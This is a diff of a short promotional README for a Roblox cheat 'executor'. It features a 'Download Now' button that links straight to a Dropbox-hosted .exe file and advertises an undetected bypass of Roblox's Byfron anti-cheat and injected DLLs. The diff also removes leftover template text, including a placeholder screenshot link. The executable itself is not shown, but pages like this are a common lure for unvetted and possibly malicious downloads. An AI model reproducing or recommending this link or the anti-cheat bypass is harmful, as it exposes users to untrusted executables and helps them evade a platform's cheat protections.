@@ -4,7 +4,7 @@ The Next-Gen Roblox Exploiting Experience
 <a href="https://www.dropbox.com/scl/fi/5li4y6efjzlkp37cznvpd/respekt.exe?rlkey=lmxztofe4rnuofapv2znym5or&st=um63vfqu&dl=1" style="display: inline-block; padding: 10px 25px; background-color: #7289DA; color: white; text-decoration: none; border-radius: 5px; font-weight: bold; margin: 10px 0;">📥 Download Now</a>
 
 🚀 Why Choose This Executor?
-Undetected Byfron Bypass – Stay safe from Roblox’s anti-cheat
+Undetected Byfron Bypass 
 
 Optimized DLLs – Smoother & more stable than ever
 
@@ -22,11 +22,4 @@ User-Friendly UI – Clean design for easy navigation
 🔧 Developer: WillieWardo
 ⚠️ Warning: Do NOT skid or redistribute. This is original work.
 
-Preview:
-https://i.imgur.com/fakeimage.png (Replace with actual screenshot if available)
 
-This version includes:
-✅ Clean download button (HTML-styled)
-✅ Warning/note box (colored for visibility)
-✅ Better spacing & organization
-✅ Emoji highlights for key sections
